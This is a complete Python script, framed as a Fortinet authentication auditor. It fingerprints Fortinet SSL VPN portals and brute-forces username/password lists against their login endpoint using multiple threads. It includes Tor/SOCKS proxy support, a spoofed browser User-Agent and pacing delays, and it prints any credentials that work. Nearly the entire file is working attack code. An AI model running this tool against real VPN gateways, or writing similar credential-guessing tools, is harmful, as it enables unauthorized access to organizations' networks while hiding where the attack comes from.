import time
import requests
import threading
import argparse
import os
from queue import Queue
from urllib3.exceptions import InsecureRequestWarning

# Suppress warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Defaults
TIME_OUT = 10
DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"

def load_list(input_val):
    """Helper to return a list whether input is a file path or a single string."""
    if os.path.isfile(input_val):
        with open(input_val, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return [input_val]

def logout(url, cookies, proxies, headers):
    try:
        requests.get(f"{url}/remote/logout", cookies=cookies, timeout=TIME_OUT, headers=headers, proxies=proxies, verify=False)
    except:
        pass

def check_if_fortinet(url, proxies, headers):
    try:
        response = requests.get(f"{url}/remote/login?lang=en", timeout=TIME_OUT, headers=headers, proxies=proxies, verify=False)
        return response.status_code == 200 and "fortinet" in response.text.lower()
    except:
        return False

def login_attempt(url, user, pwd, proxies, headers):
    try:
        post_params = {"ajax": '1', "username": user, "credential": pwd}
        response = requests.post(f"{url}/remote/logincheck", data=post_params, timeout=TIME_OUT, headers=headers, proxies=proxies, verify=False)
        # Check for Fortinet-specific successful login markers
        if response.status_code == 200 and "redir=" in response.text:
            logout(url, response.cookies, proxies, headers)
            return True
    except:
        pass
    return False

def worker(task_queue, proxies, headers, brute_delay, results):
    """Processes login tasks from the queue."""
    while not task_queue.empty():
        try:
            url, user, pwd = task_queue.get_nowait()
        except:
            break

        # Stop trying this URL if a valid login was already found by another thread
        if url in results:
            task_queue.task_done()
            continue

        print(f"[*] Testing {url} | User: {user} | Pass: {pwd}")
        
        if login_attempt(url, user, pwd, proxies, headers):
            print(f"\n[!] SUCCESS: {url} | USER: {user} | PASS: {pwd}\n")
            results.add(url)
        
        if brute_delay > 0:
            time.sleep(brute_delay)
            
        task_queue.task_done()

def main():
    parser = argparse.ArgumentParser(description="Fortinet Auth Auditor (Single or Multi-threaded)")
    parser.add_argument("-t", "--target", required=True, help="IP or path to IP list")
    parser.add_argument("-u", "--user", required=True, help="Username or path to user list")
    parser.add_argument("-p", "--password", required=True, help="Password or path to password list")
    parser.add_argument("-P", "--port", type=int, default=443, help="Target port (default: 443)")
    parser.add_argument("-w", "--threads", type=int, default=1, help="Number of concurrent threads (default: 1)")
    parser.add_argument("-d", "--delay", type=int, default=0, help="Seconds to wait between attempts per thread")
    parser.add_argument("-f", "--force", action="store_true", help="Skip Fortinet fingerprinting")
    parser.add_argument("--proxy", help="SOCKS5/HTTP proxy (e.g. socks5://127.0.0.1:9050)")
    parser.add_argument("--user-agent", help="Custom User-Agent string")
    
    args = parser.parse_args()

    # Configuration
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    headers = {"User-Agent": args.user_agent if args.user_agent else DEFAULT_UA}
    
    ips = load_list(args.target)
    users = load_list(args.user)
    pwds = load_list(args.password)
    
    task_queue = Queue()
    found_urls = set() 

    print(f"[*] Initializing audit...")

    for ip in ips:
        url = f"https://{ip}:{args.port}"
        
        # Verify target if --force is not used
        if not args.force:
            print(f"[*] Fingerprinting {ip}...")
            if not check_if_fortinet(url, proxies, headers):
                print(f"[-] {ip} is not identified as Fortinet. Skipping.")
                continue
        
        # Add all credential combinations for this IP to the queue
        for user in users:
            for pwd in pwds:
                task_queue.put((url, user, pwd))

    total_tasks = task_queue.qsize()
    if total_tasks == 0:
        print("[-] No valid targets found to process.")
        return

    print(f"[*] Mode: {'Single-threaded' if args.threads == 1 else f'Multi-threaded ({args.threads} threads)'}")
    print(f"[*] Total combinations to test: {total_tasks}\n")

    threads = []
    # Cap threads at the number of tasks if tasks are fewer than requested threads
    active_threads = min(args.threads, total_tasks)

    for i in range(active_threads):
        t = threading.Thread(target=worker, args=(task_queue, proxies, headers, args.delay, found_urls))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Exiting session...")

    print("\n[*] Audit session complete.")

if __name__ == "__main__":
    main()
